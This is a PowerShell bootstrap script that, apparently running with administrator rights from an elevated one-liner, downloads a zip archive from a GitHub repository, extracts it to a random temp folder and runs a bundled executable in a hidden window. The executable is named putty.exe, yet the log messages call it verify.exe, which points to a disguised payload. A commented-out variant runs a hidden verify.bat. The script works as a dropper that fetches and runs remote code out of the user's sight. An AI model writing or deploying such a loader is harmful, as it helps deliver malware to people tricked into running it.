$ErrorActionPreference = 'Stop'

$zipUrl  = 'https://github.com/Evelx0/setup/archive/refs/tags/v1.zip'

$rand    = [Guid]::NewGuid().ToString('N')
$workDir = Join-Path $env:TEMP ("setup-" + $rand)
$zipPath = Join-Path $env:TEMP ("setup-" + $rand + ".zip")
$logPath = Join-Path $env:TEMP ("setup-" + $rand + ".log")

Start-Transcript -Path $logPath -Append | Out-Null

try {
  # (We are already elevated because the one-liner used -Verb RunAs)
  New-Item -ItemType Directory -Path $workDir | Out-Null

  Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
  Expand-Archive -Path $zipPath -DestinationPath $workDir -Force
  Remove-Item $zipPath -Force

  $runDir = Join-Path $workDir 'setup-1'
  if (!(Test-Path $runDir)) { throw "Expected folder not found: $runDir" }

  # EXAMPLE A: run verify.bat (hidden)
  #$bat = Join-Path $runDir 'verify.bat'
  #if (Test-Path $bat) {
  #  Start-Process -FilePath 'cmd.exe' -WindowStyle Hidden -ArgumentList '/c', "`"$bat`"" -Wait
  #} else {
  #  "verify.bat not found at: $bat" | Out-File -FilePath $logPath -Append
  #}

  # EXAMPLE B: run verify.exe (hidden)
  $exe = Join-Path $runDir 'putty.exe'
  if (Test-Path $exe) {
    # Add silent args if needed: -ArgumentList '/quiet','/norestart'
    Start-Process -FilePath $exe -WindowStyle Hidden -Wait
  } else {
    "verify.exe not found at: $exe" | Out-File -FilePath $logPath -Append
  }

} catch {
  "BOOTSTRAP FAILED: $($_.Exception.Message)" | Out-File -FilePath $logPath -Append
} finally {
  Stop-Transcript | Out-Null

  # Optional cleanup:
  # try { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue } catch {}
}
